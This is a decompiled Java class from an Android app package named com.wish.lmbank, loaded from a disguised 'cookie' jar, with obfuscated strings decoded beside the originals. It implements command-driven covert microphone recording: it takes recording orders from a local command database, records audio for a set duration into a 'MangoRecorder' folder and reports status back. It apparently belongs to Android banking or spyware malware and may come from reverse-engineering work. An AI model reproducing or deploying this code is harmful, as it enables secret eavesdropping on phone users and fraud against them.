package com.wish.lmbank.helper;

import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CommandRecordingBean;
import com.wish.lmbank.db.CommandRecordingDB;
import com.wish.lmbank.utils.LogUtils;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/helper/RecorderShortHelper.class */
public class RecorderShortHelper {
    public static final int IDLE_STATE = 0;
    public static final int INTERNAL_ERROR = 2;
    public static final int NO_ERROR = 0;
    public static final int RECORDING_COMMAND_TYPE = 2;
    public static final int RECORDING_STATE = 1;
    public static final int SDCARD_ACCESS_ERROR = 1;
    private static RecorderShortHelper instance;
    private RecordingCountDownTimer mRecordingCountDownTimer;
    private final String TAG = RecorderShortHelper.class.getName();
//     private final String RECORDING_FILE_PATH = bb7d7pu7.m5998("JAgHDgY7DAoGGw0MGw");
    private final String RECORDING_FILE_PATH = "MangoRecorder";
    private int mState = 0;
    private int mType = 0;
    private MediaRecorder mRecorder = null;
    private File mSampleFile = null;
    long mSampleStart = 0;
    int mSampleLength = 0;
    private final int MESSAGE_COMMAND_RECORDING = 1;
    private Handler mUIHandler = new Handler(Looper.myLooper()) { // from class: com.wish.lmbank.helper.RecorderShortHelper.1

        @Override // android.os.Handler
        public void handleMessage(Message message) {
                if (message.what != 1) {
                    return;
                }
                RecorderShortHelper.this.mRecordingCountDownTimer = new RecordingCountDownTimer(RecorderShortHelper.this, ((Long) message.obj).longValue(), 1000L);
                RecorderShortHelper.this.mRecordingCountDownTimer.start();
                return;
        }
    };

    public void onDestroy() {
        CommandRecordingBean commandRecordingBean;
        //             LogUtils.d(this.TAG, bb7d7pu7.m5998("BgctDBodGwYQ"));
        LogUtils.d(this.TAG, "onDestroy");
        this.mUIHandler.removeCallbacksAndMessages(null);
        RecordingCountDownTimer recordingCountDownTimer = this.mRecordingCountDownTimer;
        if (recordingCountDownTimer != null) {
            recordingCountDownTimer.cancel();
            this.mRecordingCountDownTimer = null;
        }
//             ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(AppStartV.getContext()).queryCommandRecordingByStatus(bb7d7pu7.m5998("DBEMChwdAAcO"));
        ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(AppStartV.getContext()).queryCommandRecordingByStatus("executing");
        if (queryCommandRecordingByStatus != null && queryCommandRecordingByStatus.size() > 0 && (commandRecordingBean = queryCommandRecordingByStatus.get(0)) != null) {
//                 CommandRecordingDB.getInstance(AppStartV.getContext()).updateCommandRecordingStatus(commandRecordingBean.getrId(), commandRecordingBean.getPath(), bb7d7pu7.m5998("GwwKDAAfDA0"));
            CommandRecordingDB.getInstance(AppStartV.getContext()).updateCommandRecordingStatus(commandRecordingBean.getrId(), commandRecordingBean.getPath(), "received");
        }
        stopRecorder();
        return;
    }

    public static RecorderShortHelper getInstance() {
        RecorderShortHelper recorderShortHelper;
        synchronized (RecorderShortHelper.class) {
            try {
                if (instance == null) {
                    instance = new RecorderShortHelper();
                }
                recorderShortHelper = instance;
            } catch (Throwable th) {
                throw th;
            }
        }
        return recorderShortHelper;
    }

    private RecorderShortHelper() {
    }

    public void startRecording(int i, String... strArr) {
        synchronized (this) {
            String str = "";
            if (this.mState == 0) {
//                     str = strArr[0] + bb7d7pu7.m5998("Ng") + strArr[1] + bb7d7pu7.m5998("Ng");
                str = strArr[0] + "_" + strArr[1] + "_";
                setRecordingType(2);
            }
            if (!TextUtils.isEmpty(str)) {
                if (prepareRecorder(str, i)) {
                    startRecording(strArr[1]);
                } else {
                    resetReleaseRecorder();
                }
            }
        }
        return;
    }

    private void startRecording(String str) {
        String str2 = this.TAG;
//             LogUtils.d(str2, bb7d7pu7.m5998("Gh0IGx07DAoGGw0ABw5FSQQ6CAQZBQwvAAUMU0k") + this.mSampleFile + bb7d7pu7.m5998("RUkNHBsIHQAGB1NJ") + str);
        LogUtils.d(str2, "startRecording, mSampleFile: " + this.mSampleFile + ", duration: " + str);
        if (this.mSampleFile == null) {
            return;
        }
        try {
            this.mRecorder.start();
            this.mSampleStart = System.currentTimeMillis();
            setState(1);
            Message message = new Message();
            message.what = 1;
            message.obj = Long.valueOf(Long.parseLong(str));
            this.mUIHandler.sendMessage(message);
//                 updateCommandRecordingStatus(bb7d7pu7.m5998("DBEMChwdAAcO"));
            updateCommandRecordingStatus("executing");
            return;
        } catch (Exception e) {
//                 LogUtils.callLog(bb7d7pu7.m5998("DBEKDBkdAAYHRUkaHQgbHTsMCgYbDQAHDkVJJAwNAAg7DAoGGw0MG0kaHQgbHUk7HAcdAAQMLBEKDBkdAAYHU0k") + e.getLocalizedMessage());
            LogUtils.callLog("exception, startRecording, MediaRecorder start RuntimeException: " + e.getLocalizedMessage());
            setError(2);
            resetReleaseRecorder();
            return;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void updateCommandRecordingStatus(String str) {
        String[] isRecordingFileAvailable = isRecordingFileAvailable();
        if (isRecordingFileAvailable == null || 3 != isRecordingFileAvailable.length) {
//                 LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNAAcORUkcGQ0IHQwqBgQECAcNOwwKBhsNAAcOOh0IHRwaSQ8ABQwnCAQMSQAaSQcGHUkfCAUADQ"));
            LogUtils.callLog("Recording, updateCommandRecordingStatus fileName is not valid");
            return;
        }
        long updateCommandRecordingStatus = CommandRecordingDB.getInstance(AppStartV.getContext()).updateCommandRecordingStatus(Integer.parseInt(isRecordingFileAvailable[0]), isRecordingFileAvailable[2], str);
//             LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNAAcORUkcGQ0IHQwqBgQECAcNOwwKBhsNAAcOOh0IHRwaRUkbDB1TSQ") + updateCommandRecordingStatus + bb7d7pu7.m5998("RUkZCB0BU0k") + isRecordingFileAvailable[2] + bb7d7pu7.m5998("RUkbIA1TSQ") + isRecordingFileAvailable[0]);
        LogUtils.callLog("Recording, updateCommandRecordingStatus, ret: " + updateCommandRecordingStatus + ", path: " + isRecordingFileAvailable[2] + ", rId: " + isRecordingFileAvailable[0]);
        return;
    }

    public void stopRecorder() {
        synchronized (this) {
            String str = this.TAG;
//             LogUtils.d(str, bb7d7pu7.m5998("Gh0GGTsMCgYbDQwbRUkEOwwKBhsNDBtTSQ") + this.mRecorder);
            LogUtils.d(str, "stopRecorder, mRecorder: " + this.mRecorder);
            MediaRecorder mediaRecorder = this.mRecorder;
            if (mediaRecorder == null) {
                setState(0);
                return;
            }
            try {
                mediaRecorder.setOnErrorListener(null);
                this.mRecorder.setOnInfoListener(null);
                this.mRecorder.setPreviewDisplay(null);
                this.mRecorder.stop();
                resetReleaseRecorder();
                if (this.mSampleFile != null) {
                    this.mSampleLength = (int) ((System.currentTimeMillis() - this.mSampleStart) / 1000);
                }
            } catch (RuntimeException e) {
//                 LogUtils.callLog(bb7d7pu7.m5998("DBEKDBkdAAYHRUkaHQYZOwwKBhsNDBtFSTscBx0ABAwsEQoMGR0ABgdTSRodBhlBQEkAGkkKCAUFDA1JAAQEDA0ACB0MBRBJCA8dDBtJGh0IGx1BQA"));
                LogUtils.callLog("exception, stopRecorder, RuntimeException: stop() is called immediately after start()");
                setError(2);
                resetReleaseRecorder();
                if (this.mSampleFile != null) {
                    this.mSampleLength = (int) ((System.currentTimeMillis() - this.mSampleStart) / 1000);
                }
            }
            setState(0);
        }
    }

    private boolean prepareRecorder(String str, int i) {
        boolean canWrite = Environment.getExternalStorageDirectory().canWrite();
//         String m5998 = bb7d7pu7.m5998("JAgHDgY7DAoGGw0MGw");
        String m5998 = "MangoRecorder";
//         File file = !canWrite ? new File(bb7d7pu7.m5998("Gg0KCBsNRhoNCggbDQ"), m5998) : new File(Environment.getExternalStorageDirectory().getAbsolutePath(), m5998);
        File file = !canWrite ? new File("sdcard/sdcard", m5998) : new File(Environment.getExternalStorageDirectory().getAbsolutePath(), m5998);
        if (!file.exists()) {
            file.mkdir();
        }
//         String m59982 = bb7d7pu7.m5998("RwgEGw");
        String m59982 = ".amr";
        if (i == 1) {
//             m59982 = bb7d7pu7.m5998("R1oOGQ");
            m59982 = ".3gp";
        } else if (i == 2) {
//             m59982 = bb7d7pu7.m5998("RwQZWg");
            m59982 = ".mp3";
        } else if (i == 3) {
        }
        try {
            this.mSampleFile = File.createTempFile(str, m59982, file);
            MediaRecorder mediaRecorder = new MediaRecorder();
            this.mRecorder = mediaRecorder;
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            this.mRecorder.setOutputFormat(i);
            this.mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            this.mRecorder.setOutputFile(this.mSampleFile.getAbsolutePath());
            try {
                this.mRecorder.prepare();
                return true;
            } catch (IOException e) {
                StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("DBEKDBkdAAYHRUkZGwwZCBsMOwwKBhsNDBtFSSQMDQAIOwwKBhsNDBtJGRsMGQgbDEkgJiwRCgwZHQAGB0lTSQ"));
                sb.append("exception, prepareRecorder, MediaRecorder prepare IOException : ");
                sb.append(e.getMessage());
                LogUtils.callLog(sb.toString());
                setError(2);
                resetReleaseRecorder();
                return false;
            }
        } catch (IOException e2) {
            String str2 = this.TAG;
            StringBuilder sb2 = new StringBuilder();
//             sb2.append(bb7d7pu7.m5998("ICYsEQoMGR0ABgdT"));
            sb2.append("IOException:");
            sb2.append(e2.getMessage());
            LogUtils.v(str2, sb2.toString());
            setError(1);
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/helper/RecorderShortHelper$RecordingCountDownTimer.class */
    public class RecordingCountDownTimer extends CountDownTimer {
        final RecorderShortHelper this$0;

        @Override // android.os.CountDownTimer
        public void onTick(long j) {
        }

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public RecordingCountDownTimer(RecorderShortHelper recorderShortHelper, long j, long j2) {
            super(j, j2);
            this.this$0 = recorderShortHelper;
        }

        @Override // android.os.CountDownTimer
        public void onFinish() {
            //                 LogUtils.v(this.this$0.TAG, bb7d7pu7.m5998("RERERERERERERERERERERERERERJOwwKBhsNAAcOKgYcBx0tBh4HPQAEDBtJBgcvAAcAGgFJRERERERERERERERERERERERERERJ"));
            LogUtils.v(this.this$0.TAG, "-------------------- RecordingCountDownTimer onFinish -------------------- ");
            this.this$0.stopRecorder();
//                 this.this$0.updateCommandRecordingStatus(bb7d7pu7.m5998("DwAHABoBDA0"));
            this.this$0.updateCommandRecordingStatus("finished");
//                 LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNAAcOKgYcBx0tBh4HPQAEDBtJBgcvAAcAGgE"));
            LogUtils.callLog("RecordingCountDownTimer onFinish");
            return;
        }
    }

    private void resetReleaseRecorder() {
        String str = this.TAG;
        StringBuilder sb = new StringBuilder();
//         sb.append(bb7d7pu7.m5998("GwwaDB07DAUMCBoMOwwKBhsNDBtJRUkEOwwKBhsNDBtTSQ"));
        sb.append("resetReleaseRecorder , mRecorder: ");
        sb.append(this.mRecorder);
        LogUtils.d(str, sb.toString());
        MediaRecorder mediaRecorder = this.mRecorder;
        if (mediaRecorder == null) {
            return;
        }
        mediaRecorder.reset();
        this.mRecorder.release();
        this.mRecorder = null;
    }

    private void setRecordingType(int i) {
        if (i == this.mType) {
            return;
        }
        this.mType = i;
    }

    private void setState(int i) {
        if (i == this.mState) {
            return;
        }
        this.mState = i;
    }

    private void setError(int i) {
        setState(0);
    }

    public File getSampleFile() {
        return this.mSampleFile;
    }

    public int state() {
        return this.mState;
    }

    private String[] isRecordingFileAvailable() {
        File sampleFile = getSampleFile();
        if (sampleFile == null) {
//                 LogUtils.d(this.TAG, bb7d7pu7.m5998("ABo7DAoGGw0ABw4vAAUMKB8IAAUICwUMSQQvAAUMSQAaSQccBQU"));
            LogUtils.d(this.TAG, "isRecordingFileAvailable mFile is null");
            return null;
        }
//             String[] split = sampleFile.getName().split(bb7d7pu7.m5998("Ng"));
        String[] split = sampleFile.getName().split("_");
        split[split.length - 1] = sampleFile.getAbsolutePath();
        return split;
    }

    public void deleteFile() {
        File file = this.mSampleFile;
        if (file != null && file.exists()) {
            this.mSampleFile.delete();
        }
        this.mSampleFile = null;
        this.mSampleLength = 0;
    }
}
